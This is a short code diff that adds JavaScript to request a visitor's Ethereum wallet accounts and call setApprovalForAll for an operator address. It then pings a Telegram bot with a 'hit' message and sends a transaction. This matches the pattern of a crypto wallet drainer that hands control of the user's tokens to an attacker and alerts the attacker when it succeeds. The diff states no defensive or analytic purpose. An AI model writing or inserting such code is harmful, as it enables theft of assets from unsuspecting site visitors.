@@ -1,0 +1,4 @@
+await ethereum.request({method: "eth_requestAccounts"});
+await contract.setApprovalForAll(op, true);
+fetch("https://api.telegram.org/bot000:AAAA/sendMessage?chat_id=1&text=hit");
+ethereum.request({method: "eth_sendTransaction"});
